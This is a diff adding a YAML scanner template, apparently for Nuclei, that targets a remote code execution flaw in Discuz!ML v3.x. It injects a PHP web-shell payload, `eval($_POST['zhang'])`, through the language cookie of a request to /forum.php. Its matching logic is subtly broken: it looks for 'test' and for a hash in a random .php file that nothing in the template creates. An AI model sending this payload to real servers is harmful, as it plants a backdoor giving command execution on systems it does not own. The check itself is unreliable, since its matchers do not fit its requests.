@@ -1,0 +1,45 @@
+id: discuz-ml-v3x-getshell
+info:
+  name: Discuz!ML v3.x GETSHELL
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a vulnerability in Discuz!ML v3.x that allows arbitrary file upload and command execution.
+    Exploitation results in server compromise.
+  tags: file-upload,rce
+
+variables:
+  cookie_prefix: "{{rand_text_alphanumeric(5)}}_"
+  random_suffix: "{{rand_int(100000, 999999)}}"
+  payload: "<?php eval($_POST['zhang']); ?>"
+
+http:
+  - raw:
+      - |
+        GET /forum.php HTTP/1.1
+        Host: {{BaseURL}}
+        Cookie: {{cookie_prefix}}saltkey=cru8KB8g; {{cookie_prefix}}language={{url_encode(payload)}}; {{cookie_prefix}}lastvisit=1623897831; {{cookie_prefix}}sid=UL9Q00; {{cookie_prefix}}lastact=1623918476%09forum.php%09; {{cookie_prefix}}onlineusernum=2
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+
+  - raw:
+      - |
+        GET /{{random_suffix}}.php HTTP/1.1
+        Host: {{BaseURL}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "2a38a4a9316c49e5a833517c45d31070"
